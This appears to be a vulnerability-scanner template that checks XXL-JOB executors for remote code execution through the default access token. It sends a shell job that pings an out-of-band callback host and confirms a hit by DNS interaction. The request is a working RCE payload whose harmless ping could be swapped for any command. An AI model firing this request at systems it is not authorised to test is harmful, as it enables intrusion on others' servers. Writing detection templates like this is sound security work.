id: xxl-job-executor-default-accessToken-RCE

info:
  name: xxl-job-executor-default-accessToken-RCE
  author: xxl-job-executor-default-accessToken-RCE
  severity: high


variables:
  randjobid: "{{rand_int(999,999999)}}"
  datetime: '{{date_time("%Y-%M-%D %H:%m:%s")}}'
  unix_time: '{{date_time("{{datetime}}",unix_time())}}'
http:
  - raw:
      - |
        POST /run HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        XXL-JOB-ACCESS-TOKEN: default_token
        Content-Type: application/json

        {
          "jobId": {{randjobid}},
          "executorHandler": "demoJobHandler",
          "executorParams": "demoJobHandler",
          "executorBlockStrategy": "COVER_EARLY",
          "executorTimeout": 0,
          "logId": {{randjobid}},
          "logDateTime": {{unix_time}},
          "glueType": "GLUE_SHELL",
          "glueSource": "ping {{interactsh-url}}",
          "glueUpdatetime": {{unix_time}},
          "broadcastIndex": 0,
          "broadcastTotal": 0
        }

    req-condition: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"
#